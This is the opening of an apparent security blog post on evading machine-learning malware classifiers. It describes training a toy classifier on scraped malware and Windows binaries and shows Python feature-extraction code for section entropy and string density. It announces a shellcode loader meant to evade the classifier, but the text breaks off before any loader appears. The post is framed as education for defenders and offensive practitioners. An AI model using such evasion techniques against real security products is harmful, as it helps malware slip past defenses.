# https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine

<!DOCTYPE html><html lang="en" class="rounded-corners theme-clean no-tint sidebar-default sidebar-list-default links-default depth-subtle __variable_7d5705 __variable_4d8f45 __variable_7857c7 font-Inter sheet-open:gutter-stable dark" style="color-scheme: dark;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Machine learning classifiers are a part of any serious security product in 2025. However, despite the ubiquity of these technologies, there’s little open-source research on how machine learning algorithms work, particularly on how to evade these systems for offensive security purposes effectively. I recently gave a talk at <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://44con.com/44con-2025-talks-and-workshops/">44Con<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4o38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4o38qav5ukqiv5ubsnpfivb_)"></rect></svg></a> on this topic, and it occurred to me that there is a significant lack of introductory content about this type of work. I thought that was pretty lame, and figured I could put something together that might benefit the community.<!-- --></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The purpose of this blog is to improve that situation by walking through a <strong class="font-bold">very primitive,</strong> low-dimensional example of a machine learning classifier. We’ll build the classifier with some deliberately terrible data, and then construct a compact shellcode loader that circumvents it. The goal is not to glorify evasion, but to develop practical intuition about classifier behavior so defenders and offensive security practitioners can better understand these systems and the attacks against these systems. Relevant code and figures can be found in the <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/0xTriboulet/evading_the_machine">repository<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4o58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4o58qav5ukqiv5ubsnpfivb_)"></rect></svg></a>.</p><h2 id="building-a-classifier" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine#building-a-classifier"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_478qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_478qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Building A Classifier</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Before we can build our classifier in earnest, we need to collect some data. We won't spend a lot of time on how I went about this; I simply scraped random malware samples from <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://vx-underground.org/Samples/MalwareIngestion/2024.12">vx-underground<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4o98qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4o98qav5ukqiv5ubsnpfivb_)"></rect></svg></a> and random Windows binaries into a local directory. Once I collected the binaries, I started by thinking through some potentially useful classification features for this data and finally settled on a few I thought would work well enough.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The feature extractor is intentionally simple. It first filters files by the MZ header so we only process real PE binaries, then pulls three scalar features from each file: a <strong class="font-bold">size-weighted section entropy</strong>, a <strong class="font-bold">strings density</strong> (count of printable ASCII substrings of length ≥4 per KB), and the <strong class="font-bold">base-10 log of the file size</strong>. Entropy is computed on each section’s raw bytes from a byte histogram and averaged with the section size as the weight, which makes the metric sensitive to large, packed, or compressed regions.</p><div class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs" style="background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit;color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"><code id="_S_1_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">#</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> Section entropy</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    weighted_entropy </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0.0</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">try</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">:</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        pe </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> pefile</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">PE</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">binary_path</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">fast_load</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">True</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        section_entropies </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">[]</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        section_sizes </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">[]</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">for</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> section </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">in</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> pe</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">sections</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">:</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">            data </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> section</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">get_data</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">()</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">            entropy </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">shannon_entropy</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">data</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">            section_entropies</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">append</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">entropy</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">            section_sizes</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">append</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">len</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">data</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">))</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">if</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> section_sizes</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">:</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">            weighted_entropy </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> np</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">average</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">section_entropies</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">weights</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">section_sizes</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">except</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">Exception</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">:</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">        weighted_entropy </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0.0</span></span></span></code></pre></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">String density captures how much human-readable material a binary contains relative to its size (helpful in spotting stripped/packed payloads).</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_h8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">    # Strings density<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    min_len = 4<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    count_strings = 0<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    current = bytearray()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    printable = set(bytes(string.printable, "ascii"))<!-- -->
